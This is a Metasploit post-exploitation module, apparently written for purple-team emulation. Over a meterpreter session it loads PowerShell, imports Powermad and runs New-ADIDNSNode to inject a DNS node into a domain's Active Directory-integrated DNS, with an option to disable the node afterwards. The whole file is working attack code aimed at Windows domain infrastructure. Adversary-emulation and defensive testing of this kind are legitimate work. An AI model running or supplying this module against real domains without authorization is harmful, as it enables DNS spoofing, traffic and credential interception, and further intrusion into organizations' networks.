##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'ADIDNS (T????) Windows - Purple Team',
        'Description'   => %q{ Powermad contains PowerShell functions for exploiting MachineAccountQuota and DNS. This Metasploit module implements the New-ADIDNSNode function.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://blog.netspi.com/exploiting-adidns/' ],
          [ 'URL', 'https://github.com/Kevin-Robertson/Powermad' ]],
        'SessionTypes'  => [ 'meterpreter' ]
    ))
    register_options(
    [
      OptString.new('NAME', [true, 'Name of the node to add', "praetorian"]),
      OptAddress.new('DC-IP', [true, 'DC IP address', ""]),
      OptBool.new('INFOREST', [true, 'Domain is part of a forest', false]),
      OptBool.new('CLEANUP', [true, 'Remove node after creation', false])
    ])
  end

  def run
    begin
      print_status("Loading PowerShell")
      client.run_cmd("load powershell")
      print_status("Import powermad")
      client.run_cmd("powershell_import data/purple/adidns/powermad.ps1")

      if datastore['CLEANUP']
        print_status("Executing Disable-ADIDNSNode -Node #{datastore['NAME']} -Verbose" + (datastore['INFOREST'] ? "-Partition ForestDNSZones" : "" ))
        client.run_cmd("powershell_execute \"Disable-ADIDNSNode -Node #{datastore['NAME']} -Verbose" + (datastore['INFOREST'] ? " -Partition ForestDNSZones\"" : "\"" ))
      else
        if datastore['INFOREST']
          print_status("Executing New-ADIDNSNode -Node #{datastore['NAME']} -Verbose -Tombstone -Partition ForestDNSZones -DomainController #{datastore['DC-IP']}")
          client.run_cmd("powershell_execute \"New-ADIDNSNode -Node #{datastore['NAME']} -Verbose -Tombstone -Partition ForestDNSZones -DomainController #{datastore['DC-IP']}\"")
        else
          print_status("Executing New-ADIDNSNode -Node #{datastore['NAME']} -Verbose -Tombstone -DomainController #{datastore['DC-IP']}")
          client.run_cmd("powershell_execute \"New-ADIDNSNode -Node #{datastore['NAME']} -Verbose -Tombstone -DomainController #{datastore['DC-IP']}\"")
        end
      end

      print_good("ADIDNS execution complete")
    rescue::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("adidns execution failed")
    end
  end
end
